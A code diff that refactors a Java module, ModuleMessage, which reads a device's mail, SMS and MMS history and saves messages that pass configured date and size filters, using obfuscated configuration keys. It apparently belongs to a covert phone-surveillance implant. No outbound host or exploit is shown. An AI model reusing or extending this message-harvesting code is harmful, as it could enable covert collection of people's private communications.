@@ -51,6 +51,9 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	private static final String TAG = "ModuleMessage"; //$NON-NLS-1$
 	//$NON-NLS-1$
 	private static final int SMS_VERSION = 2010050501;
+	private static final int ID_MAIL = 0;
+	private static final int ID_SMS = 1;
+	private static final int ID_MMS = 2;
 	private boolean mailEnabled;
 	private boolean smsEnabled;
 	private boolean mmsEnabled;
@@ -59,16 +62,13 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	Markup storedMMS;
 	Markup storedSMS;
+	//Markup storedEMAIL;
 
-	private Filter filterEmailCollect;
-	private Filter filterEmailRuntime;
-	private Filter filterSmsCollect;
-	private Filter filterSmsRuntime;
-	private Filter filterMmsCollect;
-	private Filter filterMmsRuntime;
 	private Markup configMarkup;
 	private int lastMMS;
 	private int lastSMS;
+	private Filter[] filterCollect = new Filter[3];
+	private Filter[] filterRuntime = new Filter[3];
 
 	// private SmsHandler smsHandler;
 
@@ -79,6 +79,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		storedMMS = new Markup(this, 1);
 		storedSMS = new Markup(this, 2);
+		//storedEMAIL = new Markup(this, 4);
 		configMarkup = new Markup(this, 3);
 
 		String[] config = new String[] { "", "", "" };
@@ -96,70 +97,21 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		// {"mms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-28 09:40:05"}},"sms":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2010-09-01 00:00:00"}},"mail":{"enabled":true,"filter":{"dateto":"0000-00-00 00:00:00","history":true,"datefrom":"2011-02-01 00:00:00"}},"module":"messages"}
 		try {
-			// mail 1=mail, 2=enabled
-			ChildConf mailJson = conf.getChild(Messages.getString("18.1")); //$NON-NLS-1$
-			mailEnabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
-			String digestConfMail = "m" + mailEnabled;
 
-			if (mailEnabled) {
-				ChildConf mailFilter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
-				boolean history = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
-				Date from = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
-				Date to = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
+			mailEnabled = readJson(ID_MAIL, Messages.getString("18.1"), conf, config);
+			smsEnabled = readJson(ID_SMS, Messages.getString("18.7"), conf, config);
+			mmsEnabled = readJson(ID_MMS, Messages.getString("18.9"), conf, config);
 
-				int maxSizeToLog = 4096;
-				filterEmailCollect = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
-				filterEmailRuntime = new Filter(mailEnabled, maxSizeToLog);
-
-				digestConfMail += "_" + history + "_" + from + "_" + to;
-			}
-
-			// sms
-			ChildConf smsJson = conf.getChild(Messages.getString("18.7")); //$NON-NLS-1$
-			smsEnabled = smsJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
-			String digestConfSms = "s" + smsEnabled;
-			if (smsEnabled) {
-				ChildConf mailFilter = smsJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
-				boolean history = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
-				Date from = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
-				Date to = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
-
-				int maxSizeToLog = 4096;
-				filterSmsCollect = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
-				filterSmsRuntime = new Filter(smsEnabled, maxSizeToLog);
-				digestConfSms += "_" + history + "_" + from + "_" + to;
-			}
-
-			// mms
-			ChildConf mmsJson = conf.getChild(Messages.getString("18.9")); //$NON-NLS-1$
-			mmsEnabled = mmsJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
-			String digestConfMms = "M" + mmsEnabled;
-			if (mmsEnabled) {
-				ChildConf mailFilter = mmsJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
-				boolean history = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
-				Date from = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
-				Date to = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
-
-				int maxSizeToLog = 4096;
-				filterMmsCollect = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
-				filterMmsRuntime = new Filter(mmsEnabled, maxSizeToLog);
-				digestConfMms += "_" + history + "_" + from + "_" + to;
-			}
-
-			config[0] = digestConfMail;
-			config[1] = digestConfSms;
-			config[2] = digestConfMms;
-
-			if (!config[0].equals(oldConfig[0])) {
+			if (!config[ID_MAIL].equals(oldConfig[ID_MAIL])) {
 				// configMailChanged = true;
 			}
 
-			if (!config[1].equals(oldConfig[1])) {
+			if (!config[ID_SMS].equals(oldConfig[ID_SMS])) {
 				// configSmsChanged = true;
 				storedSMS.removeMarkup();
 			}
 
-			if (!config[2].equals(oldConfig[2])) {
+			if (!config[ID_MMS].equals(oldConfig[ID_MMS])) {
 				storedMMS.removeMarkup();
 			}
 
@@ -178,6 +130,33 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		}
 
 		return true;
+	}
+
+	private boolean readJson(int id, String child, ConfModule jsonconf, String[] config) throws ConfigurationException {
+		ChildConf mailJson = jsonconf.getChild(child); //$NON-NLS-1$
+		boolean enabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
+		String digestConfMail = child + "_" + enabled;
+
+		if (enabled) {
+			ChildConf filter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
+			boolean history = filter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
+			int maxSizeToLog = 4096;
+			digestConfMail += "_" + history;
+			if (history) {
+				Date from = filter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
+				Date to = filter.getDate(Messages.getString("18.6"), null); //$NON-NLS-1$
+				//sizeToLog = 
+
+				filterCollect[id] = new Filter(history, from, to, maxSizeToLog, maxSizeToLog);
+				digestConfMail += "_" + from + "_" + to;
+			}
+			filterRuntime[id] = new Filter(enabled, maxSizeToLog);
+
+		}
+
+		config[id] = digestConfMail;
+
+		return enabled;
 	}
 
 	@Override
@@ -286,7 +265,11 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			try {
 				final Mms mms = iterMms.next();
 				mms.print();
-				if (filterMmsCollect.filterMessage(mms.getDate(), mms.getSize(), 0) == Filter.FILTERED_OK) {
+				if (Cfg.DEBUG) {
+					Check.asserts(filterCollect[ID_MMS] != null,
+							" (readHistoricMms) Assert failed: filterCollect[ID_MMS] null");
+				}
+				if (filterCollect[ID_MMS].filterMessage(mms.getDate(), mms.getSize(), 0) == Filter.FILTERED_OK) {
 					saveMms(mms);
 				}
 			} catch (Exception ex) {
@@ -310,7 +293,12 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		while (iterSms.hasNext()) {
 			final Sms s = iterSms.next();
-			if (filterSmsCollect.filterMessage(s.getDate(), s.getSize(), 0) == Filter.FILTERED_OK) {
+			if (Cfg.DEBUG) {
+				Check.asserts(filterCollect[ID_SMS] != null,
+						" (readHistoricMms) Assert failed: filterCollect[ID_SMS] null");
+			}
+
+			if (filterCollect[ID_SMS].filterMessage(s.getDate(), s.getSize(), 0) == Filter.FILTERED_OK) {
 				saveSms(s);
 			}
 		}
